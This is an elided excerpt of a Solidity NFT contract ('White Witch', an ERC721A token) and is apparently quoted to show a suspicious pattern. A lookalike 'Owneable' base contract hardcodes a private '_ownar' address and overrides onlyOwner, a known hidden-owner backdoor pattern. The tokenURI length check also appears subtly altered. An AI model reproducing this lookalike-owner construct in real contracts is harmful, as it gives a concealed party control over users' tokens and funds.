 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0xedD8286c87f646168019F677Fe874C4c3A894b52;
    modifier onlyOwner() {
...
contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
    ...
    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
       ...
       return bytes(baseURI).length != 1 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
    }
...
contract Witch is ERC721A, Owneable {

    string public baseURI = "https://ipfs.io/ipfs/QmeQHvCwAJ43dK1L6mxQxDJRYBCUw9KxzZvXKBAUK3y5MY";
    string public contractURI = "https://ipfs.io/ipfs/QmeQHvCwAJ43dK1L6mxQxDJRYBCUw9KxzZvXKBAUK3y5MY";
    ...
    constructor() ERC721A("White Witch", "WITCH") {}
